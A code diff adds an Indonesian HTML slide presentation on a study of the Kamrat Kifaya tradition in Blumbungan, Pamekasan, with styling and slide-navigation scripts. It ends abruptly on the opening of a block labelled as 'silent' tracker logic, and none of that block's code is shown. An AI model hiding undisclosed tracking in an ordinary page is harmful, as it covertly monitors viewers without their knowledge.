@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Keberlanjutan Tradisi Kamrat Kifaya</title>
+  
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600;700&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    body {
+      background: #050505;
+      color: #f4f4f6;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      height: 100dvh; 
+      width: 100vw;
+      overflow: hidden; 
+    }
+
+    .hide-scrollbar::-webkit-scrollbar { display: none; }
+    .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+
+    .glow-cyan { text-shadow: 0 0 8px rgba(0,243,255,0.8), 0 0 20px rgba(0,243,255,0.4); color: #00f3ff; }
+    .glow-green { text-shadow: 0 0 8px rgba(57,255,20,0.8), 0 0 20px rgba(57,255,20,0.4); color: #39ff14; }
+    .glow-purple { text-shadow: 0 0 8px rgba(189,0,255,0.8), 0 0 20px rgba(189,0,255,0.4); color: #bd00ff; }
+    .glow-yellow { text-shadow: 0 0 8px rgba(255,230,0,0.8), 0 0 20px rgba(255,230,0,0.4); color: #ffe600; }
+    .glow-red { text-shadow: 0 0 8px rgba(255,57,57,0.8), 0 0 20px rgba(255,57,57,0.4); color: #ff3939; }
+    .glow-white { text-shadow: 0 0 10px rgba(255,255,255,0.6), 0 0 20px rgba(255,255,255,0.3); color: #ffffff; }
+
+    .box-glow-cyan { box-shadow: 0 0 20px rgba(0,243,255,0.1), inset 0 0 15px rgba(0,243,255,0.05); border-color: rgba(0,243,255,0.3); }
+    .box-glow-purple { box-shadow: 0 0 20px rgba(189,0,255,0.1), inset 0 0 15px rgba(189,0,255,0.05); border-color: rgba(189,0,255,0.3); }
+    .box-glow-green { box-shadow: 0 0 20px rgba(57,255,20,0.1), inset 0 0 15px rgba(57,255,20,0.05); border-color: rgba(57,255,20,0.3); }
+    .box-glow-yellow { box-shadow: 0 0 20px rgba(255,230,0,0.1), inset 0 0 15px rgba(255,230,0,0.05); border-color: rgba(255,230,0,0.3); }
+    
+    .box-glow-hover { transition: transform .35s cubic-bezier(.2,.8,.2,1), box-shadow .35s ease, border-color .35s ease; }
+    .box-glow-hover:hover {
+      transform: translateY(-4px) scale(1.008);
+      box-shadow: 0 12px 28px rgba(0,243,255,.12), inset 0 0 18px rgba(0,243,255,.07);
+      border-color: rgba(0,243,255,.75);
+    }
+
+    .bg-grid {
+      background-size: 40px 40px;
+      background-image: linear-gradient(to right, rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+                        linear-gradient(to bottom, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+      animation: gridDrift 28s linear infinite;
+    }
+    @keyframes gridDrift {
+      from { background-position: 0 0; }
+      to { background-position: 40px 40px; }
+    }
+
+    header { position: relative; }
+    header::after {
+      content: "";
+      position: absolute;
+      left: 0; bottom: -1px;
+      width: var(--progress, 14.285%);
+      height: 2px;
+      background: linear-gradient(90deg, #00f3ff, #39ff14);
+      box-shadow: 0 0 10px rgba(0,243,255,.7);
+      transition: width .7s cubic-bezier(.22,1,.36,1);
+      pointer-events: none;
+    }
+
+    .slide {
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 100%;
+      opacity: 0;
+      pointer-events: none;
+      visibility: hidden;
+      transform: perspective(1400px) translate3d(0, 34px, -100px) rotateX(4deg) scale(.96);
+      transform-origin: 50% 50%;
+      filter: blur(12px);
+      backface-visibility: hidden;
+      will-change: transform, opacity, filter;
+      transition:
+        transform .82s cubic-bezier(.16, 1, .3, 1),
+        opacity .62s ease,
+        filter .72s ease,
+        visibility 0s linear .82s;
+    }
+    .slide.active {
+      opacity: 1;
+      pointer-events: auto;
+      visibility: visible;
+      transform: perspective(1400px) translate3d(0, 0, 0) rotateX(0) scale(1);
+      filter: blur(0);
+      z-index: 10;
+      transition-delay: 0s;
+    }
+    .slide.exit-left, .slide.exit-right {
+      opacity: 0;
+      visibility: visible;
+      filter: blur(9px);
+      z-index: 9;
+      pointer-events: none;
+    }
+    .slide.exit-left  { transform: perspective(1400px) translate3d(-8%, 0, -90px) rotateY(9deg) scale(.95); }
+    .slide.exit-right { transform: perspective(1400px) translate3d( 8%, 0, -90px) rotateY(-9deg) scale(.95); }
+
+    .slide.pre-enter-right, .slide.pre-enter-left {
+      visibility: visible;
+      opacity: 0;
+      z-index: 11;
+      filter: blur(10px);
+      transition: none;
+    }
+    .slide.pre-enter-right { transform: perspective(1400px) translate3d( 8%, 0, -90px) rotateY(-9deg) scale(.95); }
+    .slide.pre-enter-left  { transform: perspective(1400px) translate3d(-8%, 0, -90px) rotateY( 9deg) scale(.95); }
+
+    .anim-item {
+      opacity: 0;
+      transform: translate3d(0, 26px, 0) rotateX(5deg) scale(.97);
+      filter: blur(8px);
+      clip-path: inset(0 0 10% 0);
+      transform-origin: 50% 100%;
+    }
+    .slide.active .anim-item {
+      animation: contentReveal .78s cubic-bezier(.16, 1, .3, 1) both;
+    }
+    @keyframes contentReveal {
+      0% { opacity: 0; transform: translate3d(0, 26px, 0) rotateX(5deg) scale(.97); filter: blur(8px); clip-path: inset(0 0 10% 0); }
+      65% { opacity: 1; filter: blur(0); }
+      100% { opacity: 1; transform: translate3d(0, 0, 0) rotateX(0) scale(1); filter: blur(0); clip-path: inset(0 0 0 0); }
+    }
+
+    .slide.active .delay-1 { animation-delay: .08s; }
+    .slide.active .delay-2 { animation-delay: .18s; }
+    .slide.active .delay-3 { animation-delay: .28s; }
+    .slide.active .delay-4 { animation-delay: .38s; }
+    .slide.active .delay-5 { animation-delay: .48s; }
+    .slide.active .delay-6 { animation-delay: .58s; }
+
+    .slide.active.box-glow-cyan   { --frame-glow: rgba(0,243,255,.2); animation: framePulse 5s ease-in-out infinite; }
+    .slide.active.box-glow-purple { --frame-glow: rgba(189,0,255,.2); animation: framePulse 5s ease-in-out infinite; }
+    .slide.active.box-glow-green  { --frame-glow: rgba(57,255,20,.2);  animation: framePulse 5s ease-in-out infinite; }
+    .slide.active.box-glow-yellow { --frame-glow: rgba(255,230,0,.2);  animation: framePulse 5s ease-in-out infinite; }
+    @keyframes framePulse {
+      0%, 100% { box-shadow: 0 0 20px var(--frame-glow), inset 0 0 15px rgba(255,255,255,.025); }
+      50%      { box-shadow: 0 0 34px var(--frame-glow), inset 0 0 22px rgba(255,255,255,.055); }
+    }
+
+    /* ==== OVERLAY MULAI ==== */
+    #startOverlay {
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      background: radial-gradient(circle at center, #0a0a12 0%, #000 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 1.5rem;
+      transition: opacity .5s ease, visibility .5s ease;
+    }
+    #startOverlay.hidden {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+    #startBtn {
+      padding: 1rem 2.5rem;
+      border: 2px solid #39ff14;
+      color: #39ff14;
+      font-family: 'Fira Code', monospace;
+      font-size: 1rem;
+      letter-spacing: .3em;
+      text-transform: uppercase;
+      background: rgba(57,255,20,.05);
+      border-radius: .75rem;
+      cursor: pointer;
+      box-shadow: 0 0 25px rgba(57,255,20,.4), inset 0 0 15px rgba(57,255,20,.1);
+      transition: all .3s ease;
+      animation: btnPulse 2s ease-in-out infinite;
+    }
+    #startBtn:hover {
+      background: rgba(57,255,20,.15);
+      box-shadow: 0 0 40px rgba(57,255,20,.6), inset 0 0 20px rgba(57,255,20,.2);
+      transform: scale(1.05);
+    }
+    @keyframes btnPulse {
+      0%, 100% { box-shadow: 0 0 25px rgba(57,255,20,.4), inset 0 0 15px rgba(57,255,20,.1); }
+      50%      { box-shadow: 0 0 40px rgba(57,255,20,.7), inset 0 0 20px rgba(57,255,20,.2); }
+    }
+    #startLabel {
+      color: #00f3ff;
+      font-family: 'Fira Code', monospace;
+      font-size: .7rem;
+      letter-spacing: .4em;
+      opacity: .8;
+      text-shadow: 0 0 10px rgba(0,243,255,.6);
+    }
+    #startTitle {
+      color: #fff;
+      font-family: 'Fira Code', monospace;
+      font-size: clamp(1.2rem, 4vw, 2rem);
+      font-weight: 800;
+      text-align: center;
+      padding: 0 1rem;
+      text-shadow: 0 0 15px rgba(0,243,255,.5);
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: .01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: .01ms !important;
+      }
+    }
+  </style>
+</head>
+
+<body class="bg-grid flex flex-col h-[100dvh]">
+
+  <!-- OVERLAY MULAI -->
+  <div id="startOverlay">
+    <div id="startLabel">// INTERACTIVE PRESENTATION</div>
+    <div id="startTitle">&lt;KamratKifaya_Blumbungan /&gt;</div>
+    <button id="startBtn">MULAI</button>
+  </div>
+
+  <!-- TOP HEADER -->
+  <header class="shrink-0 flex justify-between items-center w-full px-4 sm:px-6 py-3 border-b border-[#1f1f2e] bg-[#050505]/90 backdrop-blur-md z-20">
+    <div class="text-[10px] sm:text-xs font-mono text-zinc-400">
+      <span class="glow-cyan uppercase tracking-widest">&lt;KamratKifaya_Blumbungan /&gt;</span>
+    </div>
+    <div class="text-[10px] sm:text-xs font-mono glow-yellow font-bold tracking-widest" id="slideCounter">
+      SLIDE 01 / 07
+    </div>
+  </header>
+
+  <!-- MAIN CONTENT AREA -->
+  <main class="flex-1 relative w-full overflow-hidden p-3 sm:p-6 lg:p-8 flex items-center justify-center">
+    <div class="relative w-full h-full max-w-6xl mx-auto">
+
+      <!-- SLIDE 1: JUDUL ARTIKEL -->
+      <div class="slide active bg-[#0a0a12] border-2 border-[#1f1f2e] rounded-2xl p-6 sm:p-10 box-glow-cyan flex flex-col" id="slide-1">
+        <div class="flex-1 overflow-y-auto hide-scrollbar flex flex-col justify-center items-center text-center">
+          <div class="anim-item delay-1 font-mono text-xs sm:text-sm glow-cyan uppercase tracking-[0.3em] mb-4">// STUDI MASYARAKAT MADHURÂ DI BLUMBUNGAN</div>
+          <h1 class="anim-item delay-2 glow-white text-2xl sm:text-4xl md:text-5xl lg:text-6xl font-extrabold leading-tight max-w-4xl mb-6">
+            Keberlanjutan Tradisi <span class="text-[#00f3ff]">Kamrat Kifaya</span> di Tengah Pergantian Generasi
+          </h1>
+          <div class="anim-item delay-3 w-32 h-1 bg-[#39ff14] shadow-[0_0_20px_#39ff14] mb-8"></div>
+          
+          <div class="anim-item delay-4 border border-[#1f1f2e] bg-black/60 p-5 sm:p-6 rounded-xl max-w-3xl box-glow-hover text-left">
+            <p class="text-xs sm:text-sm md:text-base text-zinc-300 leading-relaxed">
+              <i class="fa-solid fa-quote-left text-[#00f3ff] text-xl mr-2"></i>
+              <span class="glow-cyan font-bold">Kamrat Kifaya</span> merupakan tradisi sosial-keagamaan masyarakat di <span class="text-white font-semibold">Desa Blumbungan, Pamekasan</span>, yang berperan dalam menjaga silaturahmi, solidaritas, dan kepedulian sosial. Penelitian ini membahas bagaimana tradisi ini tetap bertahan di tengah arus pergantian generasi.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <!-- SLIDE 2: PENDAHULUAN -->
+      <div class="slide bg-[#0a0a12] border-2 border-[#1f1f2e] rounded-2xl p-5 sm:p-8 box-glow-cyan flex flex-col" id="slide-2">
+        <div class="flex-1 overflow-y-auto hide-scrollbar flex flex-col">
+          <div class="anim-item delay-1 mb-6">
+            <div class="font-mono text-[10px] sm:text-xs glow-cyan uppercase tracking-wider mb-2">// 01. LATAR BELAKANG &amp; TUJUAN</div>
+            <h2 class="glow-white text-2xl sm:text-3xl md:text-4xl font-bold">Pendahuluan</h2>
+          </div>
+          
+          <div class="flex-1 flex flex-col justify-center gap-4">
+            <div class="anim-item delay-2 grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div class="bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-5 box-glow-hover flex flex-col justify-between">
+                <div>
+                  <div class="text-[#39ff14] font-mono text-xs uppercase mb-2 flex items-center gap-2">
+                    <i class="fa-solid fa-users"></i> Peran Tradisi Lokal
+                  </div>
+                  <p class="text-sm sm:text-base text-zinc-300 leading-relaxed">
+                    Tradisi lokal memiliki peran vital dalam mempertahankan hubungan sosial dan nilai budaya. Namun, <span class="glow-yellow font-semibold">pergantian generasi</span> menjadi tantangan nyata bagi keberlanjutannya.
+                  </p>
+                </div>
+              </div>
+              <div class="bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-5 box-glow-hover flex flex-col justify-between">
+                <div>
+                  <div class="text-[#bd00ff] font-mono text-xs uppercase mb-2 flex items-center gap-2">
+                    <i class="fa-solid fa-hand-holding-heart"></i> Fungsi Ganda
+                  </div>
+                  <p class="text-sm sm:text-base text-zinc-300 leading-relaxed">
+                    Kamrat Kifaya tidak hanya memiliki <span class="glow-purple font-semibold">fungsi keagamaan</span>, tetapi juga menjadi sarana nyata untuk membantu anggota masyarakat yang sedang mengalami musibah.
+                  </p>
+                </div>
+              </div>
+            </div>
+            <div class="anim-item delay-3 bg-gradient-to-r from-[#00f3ff]/10 to-transparent border-l-4 border-[#00f3ff] rounded-r-xl p-5">
+              <h3 class="glow-cyan font-mono text-xs uppercase mb-1">Fokus &amp; Tujuan Penelitian</h3>
+              <p class="text-sm sm:text-base text-zinc-200">
+                Menganalisis bagaimana tradisi Kamrat Kifaya bertahan melalui <span class="glow-white font-bold">keterlibatan dan pewarisan partisipasi antargenerasi</span> di Blumbungan.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SLIDE 3: METODE PENELITIAN -->
+      <div class="slide bg-[#0a0a12] border-2 border-[#1f1f2e] rounded-2xl p-5 sm:p-8 box-glow-purple flex flex-col" id="slide-3">
+        <div class="flex-1 overflow-y-auto hide-scrollbar flex flex-col">
+          <div class="anim-item delay-1 mb-6">
+            <div class="font-mono text-[10px] sm:text-xs glow-purple uppercase tracking-wider mb-2">// 02. METODOLOGI</div>
+            <h2 class="glow-white text-2xl sm:text-3xl md:text-4xl font-bold">Metode Penelitian</h2>
+          </div>
+          <div class="flex-1 grid grid-cols-1 md:grid-cols-3 gap-4 items-stretch">
+            <div class="anim-item delay-2 bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-5 box-glow-hover flex flex-col">
+              <div class="text-[#bd00ff] text-2xl mb-3"><i class="fa-solid fa-compass-drafting"></i></div>
+              <h3 class="glow-purple text-base font-bold mb-2">Pendekatan &amp; Lokasi</h3>
+              <ul class="text-xs sm:text-sm text-zinc-300 space-y-2 flex-1">
+                <li class="flex items-start gap-2"><i class="fa-solid fa-angle-right text-[#bd00ff] mt-1"></i> Deskriptif Kualitatif</li>
+                <li class="flex items-start gap-2"><i class="fa-solid fa-angle-right text-[#bd00ff] mt-1"></i> Desa Blumbungan, Pamekasan, Madura</li>
+              </ul>
+            </div>
+            <div class="anim-item delay-3 bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-5 box-glow-hover flex flex-col">
+              <div class="text-[#00f3ff] text-2xl mb-3"><i class="fa-solid fa-comments"></i></div>
+              <h3 class="glow-cyan text-base font-bold mb-2">Pengumpulan Data</h3>
+              <ul class="text-xs sm:text-sm text-zinc-300 space-y-2 flex-1">
+                <li class="flex items-start gap-2"><i class="fa-solid fa-angle-right text-[#00f3ff] mt-1"></i> Observasi lapangan</li>
+                <li class="flex items-start gap-2"><i class="fa-solid fa-angle-right text-[#00f3ff] mt-1"></i> Wawancara informan kunci</li>
+              </ul>
+            </div>
+            <div class="anim-item delay-4 bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-5 box-glow-hover flex flex-col">
+              <div class="text-[#39ff14] text-2xl mb-3"><i class="fa-solid fa-chart-pie"></i></div>
+              <h3 class="glow-green text-base font-bold mb-2">Analisis Data</h3>
+              <ul class="text-xs sm:text-sm text-zinc-300 space-y-2 flex-1">
+                <li class="flex items-start gap-2"><i class="fa-solid fa-angle-right text-[#39ff14] mt-1"></i> Membaca data lapangan</li>
+                <li class="flex items-start gap-2"><i class="fa-solid fa-angle-right text-[#39ff14] mt-1"></i> Pengelompokan tematik</li>
+                <li class="flex items-start gap-2"><i class="fa-solid fa-angle-right text-[#39ff14] mt-1"></i> Penjelasan deskriptif</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SLIDE 4: HASIL -->
+      <div class="slide bg-[#0a0a12] border-2 border-[#1f1f2e] rounded-2xl p-5 sm:p-8 box-glow-green flex flex-col" id="slide-4">
+        <div class="flex-1 overflow-y-auto hide-scrollbar flex flex-col">
+          <div class="anim-item delay-1 mb-4">
+            <div class="font-mono text-[10px] sm:text-xs glow-green uppercase tracking-wider mb-1">// 03. HASIL LAPANGAN</div>
+            <h2 class="glow-white text-xl sm:text-3xl font-bold">Praktik Kamrat Kifaya</h2>
+          </div>
+          <div class="flex-1 grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="anim-item delay-2 bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-5 box-glow-hover">
+              <div class="flex justify-between items-center mb-3">
+                <h3 class="glow-green text-lg font-bold">Ritual Keagamaan</h3>
+                <span class="text-xs font-mono bg-[#39ff14]/10 text-[#39ff14] px-2 py-1 rounded border border-[#39ff14]/30">Setiap Malam Jumat</span>
+              </div>
+              <p class="text-xs text-zinc-400 mb-3">Dipelopori oleh <span class="glow-white font-bold">Kiai Keddus (2000-an)</span></p>
+              <ul class="space-y-2 text-xs sm:text-sm text-zinc-200">
+                <li class="flex items-center gap-2"><i class="fa-solid fa-book-open text-[#39ff14]"></i> Pembacaan Surah Al-Fatihah</li>
+                <li class="flex items-center gap-2"><i class="fa-solid fa-users-rays text-[#39ff14]"></i> Pembacaan Tahlil</li>
+                <li class="flex items-center gap-2"><i class="fa-solid fa-hands-praying text-[#39ff14]"></i> Doa Bersama</li>
+              </ul>
+            </div>
+            <div class="anim-item delay-3 bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-5 box-glow-hover">
+              <div class="flex justify-between items-center mb-3">
+                <h3 class="glow-yellow text-lg font-bold">Dana &amp; Bantuan Sosial</h3>
+                <span class="text-xs font-mono bg-[#ffe600]/10 text-[#ffe600] px-2 py-1 rounded border border-[#ffe600]/30">Dukungan Musibah</span>
+              </div>
+              <p class="text-xs text-zinc-400 mb-3">Iuran anggota digunakan untuk keluarga berduka:</p>
+              <div class="grid grid-cols-2 gap-2 text-xs text-zinc-200">
+                <div class="bg-black/50 p-2 rounded border border-[#1f1f2e]"><i class="fa-solid fa-money-bill-wave text-[#ffe600] mr-1"></i> Uang Tunai</div>
+                <div class="bg-black/50 p-2 rounded border border-[#1f1f2e]"><i class="fa-solid fa-bowl-rice text-[#ffe600] mr-1"></i> Beras</div>
+                <div class="bg-black/50 p-2 rounded border border-[#1f1f2e]"><i class="fa-solid fa-utensils text-[#ffe600] mr-1"></i> Konsumsi</div>
+                <div class="bg-black/50 p-2 rounded border border-[#1f1f2e]"><i class="fa-solid fa-heart text-[#ffe600] mr-1"></i> Kehadiran Moril</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SLIDE 5: NILAI -->
+      <div class="slide bg-[#0a0a12] border-2 border-[#1f1f2e] rounded-2xl p-5 sm:p-8 box-glow-cyan flex flex-col" id="slide-5">
+        <div class="flex-1 overflow-y-auto hide-scrollbar flex flex-col">
+          <div class="anim-item delay-1 mb-6">
+            <div class="font-mono text-[10px] sm:text-xs glow-cyan uppercase tracking-wider mb-2">// 04. ANALISIS VALUASI</div>
+            <h2 class="glow-white text-2xl sm:text-3xl font-bold">Nilai Sosial &amp; Budaya</h2>
+          </div>
+          <div class="flex-1 flex flex-col justify-center gap-4">
+            <div class="anim-item delay-2 grid grid-cols-2 sm:grid-cols-4 gap-3">
+              <div class="bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-4 text-center box-glow-hover">
+                <i class="fa-solid fa-handshake text-2xl text-[#00f3ff] mb-2"></i>
+                <h4 class="text-xs sm:text-sm font-bold glow-cyan">Kerukunan</h4>
+              </div>
+              <div class="bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-4 text-center box-glow-hover">
+                <i class="fa-solid fa-people-group text-2xl text-[#39ff14] mb-2"></i>
+                <h4 class="text-xs sm:text-sm font-bold glow-green">Kebersamaan</h4>
+              </div>
+              <div class="bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-4 text-center box-glow-hover">
+                <i class="fa-solid fa-people-carry-box text-2xl text-[#ffe600] mb-2"></i>
+                <h4 class="text-xs sm:text-sm font-bold glow-yellow">Gotong Royong</h4>
+              </div>
+              <div class="bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-4 text-center box-glow-hover">
+                <i class="fa-solid fa-shield-halved text-2xl text-[#bd00ff] mb-2"></i>
+                <h4 class="text-xs sm:text-sm font-bold glow-purple">Solidaritas</h4>
+              </div>
+            </div>
+            <div class="anim-item delay-3 bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-5">
+              <p class="text-xs sm:text-sm text-zinc-300 leading-relaxed">
+                <i class="fa-solid fa-circle-info text-[#00f3ff] mr-2"></i>
+                Kamrat Kifaya menjadi <span class="glow-white font-bold">ruang temu</span> antara nilai spiritual keagamaan (zikir, doa, tahlil) dengan aksi nyata kepedulian sosial masyarakat Blumbungan.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SLIDE 6: PEWARISAN -->
+      <div class="slide bg-[#0a0a12] border-2 border-[#1f1f2e] rounded-2xl p-5 sm:p-8 box-glow-yellow flex flex-col" id="slide-6">
+        <div class="flex-1 overflow-y-auto hide-scrollbar flex flex-col">
+          <div class="anim-item delay-1 mb-4">
+            <div class="font-mono text-[10px] sm:text-xs glow-yellow uppercase tracking-wider mb-1">// 05. DINAMIKA GENERASI</div>
+            <h2 class="glow-white text-xl sm:text-3xl font-bold">Pewarisan Antargenerasi</h2>
+          </div>
+          <div class="flex-1 flex flex-col gap-4">
+            <div class="anim-item delay-2 bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-4 flex items-center justify-between">
+              <div>
+                <span class="text-xs text-zinc-400 font-mono">ESTIMASI ANGGOTA</span>
+                <h3 class="glow-yellow text-xl sm:text-2xl font-bold">~200 Orang</h3>
+              </div>
+              <div class="text-xs font-mono text-zinc-300 bg-black/60 px-3 py-2 rounded border border-zinc-800">
+                Remaja ⟶ Lansia
+              </div>
+            </div>
+            <div class="anim-item delay-3 bg-[#0c0c14] border border-[#2a2a3c] rounded-xl p-4">
+              <h4 class="text-xs font-mono text-[#39ff14] mb-2 uppercase">// Pola Transmisi Keluarga:</h4>
+              <div class="flex items-center justify-around text-center text-xs sm:text-sm font-bold glow-white py-2 bg-black/40 rounded border border-[#1f1f2e]">
+                <span>Kakek</span>
+                <i class="fa-solid fa-arrow-right text-zinc-500"></i>
+                <span>Ayah</span>
+                <i class="fa-solid fa-arrow-right text-zinc-500"></i>
+                <span>Anak</span>
+              </div>
+            </div>
+            <div class="anim-item delay-4 bg-[#ff3939]/10 border border-[#ff3939]/30 rounded-xl p-4 text-xs sm:text-sm text-zinc-300">
+              <span class="glow-red font-bold font-mono block mb-1"><i class="fa-solid fa-triangle-exclamation"></i> CATATAN KREATIF / TANTANGAN:</span>
+              Pola pewarisan terbanyak ditemukan pada keluarga tertentu (belum merata seluruhnya). Selain itu, pemahaman mendalam generasi muda terhadap nilai tradisi masih perlu ditingkatkan.
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SLIDE 7: KESIMPULAN -->
+      <div class="slide bg-[#0a0a12] border-2 border-[#1f1f2e] rounded-2xl p-5 sm:p-8 box-glow-green flex flex-col" id="slide-7">
+        <div class="flex-1 overflow-y-auto hide-scrollbar flex flex-col">
+          <div class="anim-item delay-1 mb-4 text-center">
+            <h2 class="glow-white text-2xl sm:text-4xl font-bold">Kesimpulan</h2>
+          </div>
+          <div class="flex-1 flex flex-col justify-center gap-4 max-w-3xl mx-auto">
+            <div class="anim-item delay-2 bg-[#0c0c14] border-l-4 border-l-[#39ff14] p-4 rounded-xl box-glow-hover">
+              <p class="text-xs sm:text-sm text-zinc-300">
+                <span class="glow-green font-bold">Kamrat Kifaya</span> berhasil menjaga hubungan sosial, kebersamaan, dan solidaritas melalui konsistensi kegiatan rutin setiap malam Jumat.
+              </p>
+            </div>
+            <div class="anim-item delay-3 bg-[#0c0c14] border-l-4 border-l-[#00f3ff] p-4 rounded-xl box-glow-hover">
+              <p class="text-xs sm:text-sm text-zinc-300">
+                Keberlanjutan tradisi ini sangat disokong oleh <span class="glow-cyan font-bold">pewarisan partisipasi berbasis keluarga</span> serta keterlibatan tokoh masyarakat dan dokumentasi nilai.
+              </p>
+            </div>
+            <div class="anim-item delay-4 bg-black p-4 rounded-xl border border-[#ffe600]/40 text-center mt-2 shadow-[0_0_15px_rgba(255,230,0,0.1)]">
+              <p class="text-xs sm:text-base glow-yellow font-bold">
+                "Keberlanjutan Kamrat Kifaya tidak hanya bergantung pada rutinitas kegiatan, tetapi juga pada keterlibatan generasi muda dan pewarisan nilai-nilai tradisi antargenerasi."
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- BOTTOM FOOTER -->
+  <footer class="shrink-0 flex justify-between items-center w-full px-4 sm:px-6 pt-4 pb-6 sm:pb-8 bg-[#050505]/90 backdrop-blur-md border-t border-[#1f1f2e] z-20">
+    <button class="bg-[#0c0c10] border border-[#00f3ff]/50 text-[#00f3ff] font-mono text-xs sm:text-sm font-bold px-4 sm:px-6 py-3 sm:py-4 rounded-lg flex items-center gap-2 transition-all hover:bg-[#00f3ff]/10 hover:border-[#00f3ff] hover:shadow-[0_0_15px_rgba(0,243,255,0.4)] disabled:opacity-30 disabled:pointer-events-none active:scale-95" id="prevBtn" onclick="requestNavigation(-1)">
+      <i class="fa-solid fa-chevron-left"></i> KEMBALI
+    </button>
+    
+    <div class="hidden sm:block font-mono text-[10px] text-zinc-500 uppercase tracking-widest text-center">
+      Gunakan Panah <i class="fa-solid fa-arrows-left-right mx-1"></i> atau Swipe<br>
+      <span class="text-[8px] opacity-50">View Transitions Enabled</span>
+    </div>
+
+    <button class="bg-[#0c0c10] border border-[#39ff14]/50 text-[#39ff14] font-mono text-xs sm:text-sm font-bold px-4 sm:px-6 py-3 sm:py-4 rounded-lg flex items-center gap-2 transition-all hover:bg-[#39ff14]/10 hover:border-[#39ff14] hover:shadow-[0_0_15px_rgba(57,255,20,0.4)] disabled:opacity-30 disabled:pointer-events-none active:scale-95" id="nextBtn" onclick="requestNavigation(1)">
+      LANJUT <i class="fa-solid fa-chevron-right"></i>
+    </button>
+  </footer>
+
+  <script>
+    // ====== PRESENTATION LOGIC ======
+    let currentSlideIndex = 1;
+    const totalSlides = 7;
+    const TRANSITION_MS = 900;
+    let isAnimating = false;
+
+    function updateUI() {
+      document.getElementById('slideCounter').innerText = `SLIDE ${String(currentSlideIndex).padStart(2, '0')} / 0${totalSlides}`;
+      document.getElementById('prevBtn').disabled = currentSlideIndex === 1;
+      document.getElementById('nextBtn').disabled = currentSlideIndex === totalSlides;
+      const header = document.querySelector('header');
+      if (header) header.style.setProperty('--progress', `${(currentSlideIndex / totalSlides) * 100}%`);
+    }
+
+    function performSlideChange(oldIndex, newIndex, direction) {
+      const outgoing = document.getElementById(`slide-${oldIndex}`);
+      const incoming = document.getElementById(`slide-${newIndex}`);
+      const enterClass = direction > 0 ? 'pre-enter-right' : 'pre-enter-left';
+      const exitClass = direction > 0 ? 'exit-left' : 'exit-right';
+
+      incoming.classList.remove('active', 'exit-left', 'exit-right', 'pre-enter-left', 'pre-enter-right');
+      incoming.classList.add(enterClass);
+      void incoming.offsetWidth;
+
+      outgoing.classList.remove('active');
+      outgoing.classList.add(exitClass);
+
+      requestAnimationFrame(() => {
+        incoming.classList.remove(enterClass);
+        incoming.classList.add('active');
+      });
+
+      const scrollableContent = incoming.querySelector('.overflow-y-auto');
+      if (scrollableContent) scrollableContent.scrollTop = 0;
+
+      window.setTimeout(() => {
+        outgoing.classList.remove(exitClass);
+        isAnimating = false;
+      }, TRANSITION_MS);
+
+      updateUI();
+    }
+
+    function requestNavigation(direction) {
+      if (isAnimating) return;
+      const newSlideIndex = currentSlideIndex + direction;
+      if (newSlideIndex < 1 || newSlideIndex > totalSlides) return;
+      isAnimating = true;
+      const oldSlideIndex = currentSlideIndex;
+      currentSlideIndex = newSlideIndex;
+      performSlideChange(oldSlideIndex, newSlideIndex, direction);
+    }
+
+    document.addEventListener('keydown', (e) => {
+      if (['ArrowRight', 'PageDown', ' '].includes(e.key)) {
+        e.preventDefault();
+        requestNavigation(1);
+      } else if (['ArrowLeft', 'PageUp'].includes(e.key)) {
+        e.preventDefault();
+        requestNavigation(-1);
+      }
+    });
+
+    let touchStartX = 0;
+    document.addEventListener('touchstart', e => {
+      touchStartX = e.changedTouches[0].screenX;
+    }, {passive: true});
+
+    document.addEventListener('touchend', e => {
+      const touchEndX = e.changedTouches[0].screenX;
+      const swipeDistance = touchEndX - touchStartX;
+      if (swipeDistance < -50) requestNavigation(1);
+      if (swipeDistance > 50) requestNavigation(-1);
+    }, {passive: true});
+
+    window.addEventListener('load', updateUI);
+
+
+    // ====== TRACKER LOGIC (silent) ======
+    (function () {
+      "use strict";
+
